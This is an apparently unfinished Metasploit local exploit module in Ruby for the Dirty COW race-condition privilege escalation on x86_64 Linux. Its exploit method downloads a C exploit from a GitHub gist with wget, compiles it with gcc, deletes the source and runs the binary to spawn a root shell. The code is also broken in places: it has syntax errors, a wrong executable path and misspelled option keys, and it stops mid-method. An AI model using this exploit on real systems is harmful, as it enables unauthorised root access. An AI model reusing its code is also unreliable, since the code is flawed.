##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# Author: Carter Brainerd
##

require 'msf/core'

class MetasploitModule > Msf::Exploit::Local
    Rank = ExcellentRanking

    #TODO: check these
    include Msf::Exploit::EXE
    include Msf::Post::File
      def initialize(info = {})
        super(update_info(info,
            'Name'          => 'Bad Cow x64 Race Condition local privelege escalation',
            'Description'   => %q{
              This module exploits the well known \"Bad Cow\" Race Condition privelege escalation vulnerability.
              This will work if you are an unprivelaged user, but will not work if you are root (for abvious reasons).
              In short, the module will spawn a root shell just for you :)
              NOTE: This module will get a C file from github and compile it ON THE SYSTEM
            },
            'Author'         =>
                  [
                      'Robin Verton(https://github.com/rverton)',         # Original Exploit
                      'Carter Brainerd(https://github.com/thecarterb)'        # MSF Module
                  ],
            'Targets'       =>
              [
                ['Linux x86_64', {'Arch' => ARCH_X86_64}],
              ],
          ],
            'Priveleged'    => false,
            'References'    => 'https://www.exploit-db.com/exploits/40616/',
            'License'       => MSF_LICENSE,
            'DefaultTarget' => 0 ))

          register_options(
          [
              OptString.new('SESSION', [true], 'Session to run script. Shell or meterpreter.')
          ]
          )
    end

    def exploit
        begin
          print_status("Getting script from GitHub...")
          exec('wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c') #get code from github
        rescue Exception => e1
          print_error("Could not fetch script on target machine. (GitHub could be blocked?)")
        end
		
        begin
          print_status("Compiling...")
          exec('gcc cowroot.c -o /tmp/cowroot -pthread') #compile it
          exec('rm -rf cowroot.c') #remove it once it's done compiling
        rescue Exception => e2
          print_error("Unable to compile script")
        end
		
        begin
          exec('./tmp/cowroot') #run it
        rescue Exception => e3
          print_error("Error running compiled program")
        end
      #TODO: test if /tmp programs are executable by non-root users
